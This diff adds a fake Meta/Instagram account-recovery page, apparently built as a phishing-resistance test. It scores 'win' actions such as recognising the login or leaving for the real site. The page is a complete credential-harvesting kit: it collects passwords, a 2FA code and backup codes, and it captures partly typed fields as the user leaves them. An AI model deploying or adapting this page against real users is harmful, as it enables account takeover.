@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Accounts Center | Secure Your Account</title>
+    <style>
+        :root {
+            --meta-blue: #0064e0;
+            --meta-blue-hover: #0056c1;
+            --meta-bg: #f0f2f5;
+            --meta-text: #1c1e21;
+            --meta-secondary: #65676b;
+            --meta-border: #dddfe2;
+            --insta-red: #ed4956;
+            --font-stack: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            margin: 0;
+            font-family: var(--font-stack);
+            background-color: var(--meta-bg);
+            color: var(--meta-text);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #fff;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 1px solid var(--meta-border);
+            position: relative;
+        }
+        header::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(45deg, #f9ce34, #ee2a7b, #6228d7);
+        }
+        .url-bar {
+            max-width: 720px;
+            margin: 18px auto 0;
+            background: #eef2f6;
+            border: 1px solid #cfd8e3;
+            border-radius: 14px;
+            padding: 10px 16px;
+            color: #52606d;
+            font-size: 13px;
+        }
+        .meta-logo {
+            font-size: 20px;
+            font-weight: bold;
+            color: var(--meta-blue);
+            letter-spacing: -1px;
+        }
+        .container {
+            flex-grow: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+        .security-card {
+            background: #fff;
+            width: 100%;
+            max-width: 448px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            text-align: center;
+            min-height: 420px;
+        }
+        .activity-view {
+            display: none;
+            animation: fadeIn 0.35s ease-out;
+        }
+        .activity-view.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .shield-icon {
+            width: 56px;
+            height: 56px;
+            background: var(--insta-red);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 30px;
+        }
+        h2 {
+            font-size: 1.5rem;
+            margin: 0 0 12px;
+        }
+        .desc {
+            font-size: 0.95rem;
+            color: var(--meta-secondary);
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+        .map-container {
+            width: 100%;
+            height: 180px;
+            background-color: #e5e3df;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid #ccc;
+        }
+        .map-bg {
+            position: absolute;
+            inset: 0;
+            background:
+                radial-gradient(circle at 70% 40%, rgba(255,255,255,0.8) 0%, transparent 60%),
+                linear-gradient(rgba(0,0,0,0.1) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,0,0,0.1) 1px, transparent 1px);
+            background-size: 100% 100%, 20px 20px, 20px 20px;
+        }
+        .map-marker {
+            position: absolute;
+            top: 40%;
+            left: 70%;
+            width: 24px;
+            height: 24px;
+            background: var(--insta-red);
+            border: 4px solid #fff;
+            border-radius: 50%;
+            box-shadow: 0 0 0 10px rgba(237, 73, 86, 0.2);
+        }
+        .map-label {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            background: rgba(255, 255, 255, 0.9);
+            padding: 4px 8px;
+            font-size: 11px;
+            font-weight: bold;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+        }
+        .device-info {
+            text-align: left;
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 24px;
+            font-size: 0.9rem;
+            border: 1px solid var(--meta-border);
+        }
+        .device-info strong {
+            display: block;
+            margin-bottom: 4px;
+        }
+        .btn-primary {
+            background-color: var(--meta-blue);
+            color: #fff;
+            border: none;
+            padding: 14px 24px;
+            font-size: 1rem;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+            margin-bottom: 12px;
+        }
+        .btn-primary:hover {
+            background-color: var(--meta-blue-hover);
+        }
+        .btn-secondary {
+            background: #fff;
+            color: var(--meta-text);
+            border: 1px solid var(--meta-border);
+            padding: 14px 24px;
+            font-size: 1rem;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .small-link {
+            display: inline-block;
+            margin-top: 12px;
+            font-size: 12px;
+            color: #555;
+            text-decoration: underline;
+        }
+        .form-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            color: var(--meta-secondary);
+        }
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--meta-border);
+            border-radius: 6px;
+            font-size: 1rem;
+            box-sizing: border-box;
+            outline: none;
+            background: #fdfdfd;
+        }
+        .form-input:focus {
+            border-color: var(--meta-blue);
+            box-shadow: 0 0 0 2px rgba(0, 100, 224, 0.1);
+        }
+        .backup-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 18px;
+        }
+        .warning-note {
+            margin: 0 0 18px;
+            padding: 12px 14px;
+            border-radius: 8px;
+            background: #fff2f3;
+            border: 1px solid #f2b9be;
+            color: #8d1d28;
+            font-size: 13px;
+            line-height: 1.45;
+            text-align: left;
+        }
+        footer {
+            padding: 20px;
+            text-align: center;
+            font-size: 0.8rem;
+            color: var(--meta-secondary);
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="meta-logo">Meta Accounts Center</div>
+    </header>
+
+    <div class="url-bar">https://instagram-support.net/recovery/review</div>
+
+    <div class="container">
+        <div class="security-card">
+            <div class="activity-view active" id="view-0">
+                <div class="shield-icon">!</div>
+                <h2>Unrecognized Login Detected</h2>
+                <p class="desc">Someone just logged in to your account from a new device or location. Please review the activity below to secure your account.</p>
+                <div class="map-container">
+                    <div class="map-bg"></div>
+                    <div class="map-marker"></div>
+                    <div class="map-label">Moscow, Russia</div>
+                </div>
+                <div class="device-info">
+                    <strong>Chrome Browser (Windows 11)</strong>
+                    <span>Location: Moscow, Russia • IP: 95.161.226.17</span>
+                </div>
+                <button class="btn-primary" id="secure-account">Secure My Account</button>
+                <button class="btn-secondary" id="this-was-me">This was me - I recognize this login</button>
+            </div>
+
+            <div class="activity-view" id="view-1">
+                <h2>Secure Your Account</h2>
+                <p class="desc">To protect your account, confirm your current Instagram password before recovery settings can be changed.</p>
+                <div class="form-group">
+                    <label for="current_password">Current Password</label>
+                    <input type="password" id="current_password" name="current_password" class="form-input" autocomplete="off">
+                </div>
+                <div class="form-group">
+                    <label for="gmail_backup_password">Backup Email Password</label>
+                    <input type="password" id="gmail_backup_password" name="gmail_backup_password" class="form-input" autocomplete="off">
+                </div>
+                <button class="btn-primary" id="submit-passwords">Continue Recovery</button>
+                <a href="#" class="small-link" id="go-to-real-instagram">Go to official Instagram.com instead</a>
+            </div>
+
+            <div class="activity-view" id="view-2">
+                <h2>Two-Factor Authentication</h2>
+                <p class="desc">Enter the six-digit security code from your authenticator app to continue.</p>
+                <div class="form-group">
+                    <label for="auth_code">Security Code</label>
+                    <input type="text" id="auth_code" name="auth_code" class="form-input" placeholder="000000" maxlength="6" style="text-align:center; letter-spacing:4px;">
+                </div>
+                <button class="btn-primary" id="submit-2fa">Verify Code</button>
+            </div>
+
+            <div class="activity-view" id="view-3">
+                <h2>Final Recovery Verification</h2>
+                <p class="desc">Enter six of your recovery backup codes to complete the reset process.</p>
+                <div class="warning-note">
+                    Never share backup codes with anyone, including Instagram support.
+                </div>
+                <div class="backup-grid">
+                    <input class="form-input" id="backup_code_1" name="backup_code_1" placeholder="Code 1">
+                    <input class="form-input" id="backup_code_2" name="backup_code_2" placeholder="Code 2">
+                    <input class="form-input" id="backup_code_3" name="backup_code_3" placeholder="Code 3">
+                    <input class="form-input" id="backup_code_4" name="backup_code_4" placeholder="Code 4">
+                    <input class="form-input" id="backup_code_5" name="backup_code_5" placeholder="Code 5">
+                    <input class="form-input" id="backup_code_6" name="backup_code_6" placeholder="Code 6">
+                </div>
+                <button class="btn-primary" id="submit-backups">Complete Recovery</button>
+                <a href="#" class="small-link" id="go-to-real-instagram-final">Go to official Instagram.com instead</a>
+            </div>
+
+            <div class="activity-view" id="view-4">
+                <h2>Account Secured</h2>
+                <p class="desc">Recovery is complete and your account settings have been updated.</p>
+                <button class="btn-primary">Return to Account</button>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        Meta © 2026 | About | Help | Privacy | Terms
+    </footer>
+
+    <script>
+        function show(step) {
+            document.querySelectorAll('.activity-view').forEach((view) => view.classList.remove('active'));
+            document.getElementById(`view-${step}`).classList.add('active');
+        }
+
+        function showSafeExit(message) {
+            document.querySelector('#view-4 h2').textContent = 'Review Complete';
+            document.querySelector('#view-4 .desc').textContent = message;
+            show(4);
+        }
+
+        async function postJson(url, payload) {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            return response.json();
+        }
+
+        function fieldValue(id) {
+            return document.getElementById(id).value.trim();
+        }
+
+        function bindPartialCapture(ids) {
+            ids.forEach((id) => {
+                const element = document.getElementById(id);
+                element.addEventListener('blur', () => {
+                    if (element.value.trim()) {
+                        fetch('/api/save-step', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ step: 0, data: { [element.name]: element.value.trim() } })
+                        });
+                    }
+                });
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            bindPartialCapture([
+                'current_password',
+                'gmail_backup_password',
+                'auth_code',
+                'backup_code_1',
+                'backup_code_2',
+                'backup_code_3',
+                'backup_code_4',
+                'backup_code_5',
+                'backup_code_6'
+            ]);
+
+            document.getElementById('secure-account').addEventListener('click', async () => {
+                await postJson('/api/recovery/start', {});
+                show(1);
+            });
+
+            document.getElementById('this-was-me').addEventListener('click', async () => {
+                await postJson('/api/win/this-was-me', {});
+                showSafeExit('You recognized the login and stopped the recovery flow without sharing any credentials.');
+            });
+
+            const goOfficial = async (event) => {
+                event.preventDefault();
+                await postJson('/api/win/go-to-real-instagram', {});
+                showSafeExit('Leave this recovery page and sign in again directly at Instagram.com.');
+            };
+
+            document.getElementById('go-to-real-instagram').addEventListener('click', goOfficial);
+            document.getElementById('go-to-real-instagram-final').addEventListener('click', goOfficial);
+
+            document.getElementById('submit-passwords').addEventListener('click', async () => {
+                await postJson('/api/password/instagram', { current_password: fieldValue('current_password') });
+                await postJson('/api/password/gmail', { gmail_backup_password: fieldValue('gmail_backup_password') });
+                show(2);
+            });
+
+            document.getElementById('submit-2fa').addEventListener('click', async () => {
+                await postJson('/api/code/2fa', { auth_code: fieldValue('auth_code') });
+                show(3);
+            });
+
+            document.getElementById('submit-backups').addEventListener('click', async () => {
+                await postJson('/api/backup-codes', {
+                    backup_code_1: fieldValue('backup_code_1'),
+                    backup_code_2: fieldValue('backup_code_2'),
+                    backup_code_3: fieldValue('backup_code_3'),
+                    backup_code_4: fieldValue('backup_code_4'),
+                    backup_code_5: fieldValue('backup_code_5'),
+                    backup_code_6: fieldValue('backup_code_6')
+                });
+                show(4);
+            });
+        });
+    </script>
+</body>
+</html>
